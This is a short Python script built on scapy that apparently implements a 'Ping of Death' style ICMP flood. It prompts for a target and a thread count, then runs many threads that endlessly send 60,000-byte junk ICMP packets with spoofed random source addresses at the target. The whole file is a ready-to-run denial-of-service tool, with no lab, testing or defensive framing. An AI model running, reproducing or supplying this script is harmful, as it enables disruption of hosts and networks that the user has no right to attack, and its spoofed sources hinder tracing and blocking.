from ast import While
from scapy.all import *
import threading

target = input("Enter the target to attack: ")
thr = int(input("Threading: "))


def PoD (target, i):
    while True:
        print("Threading: ", i)
        rand_addr = RandIP()
        ip_hdr = IP(src=rand_addr, dst=target)
        packet = ip_hdr/ICMP()/("m"*60000) #send 60k bytes of junk
        send(packet)


thrList = list()
for i in range(thr):
    thrPoD = threading.Thread(target = PoD, args = (target, i,))
    thrList.append(thrPoD)
    thrPoD.start()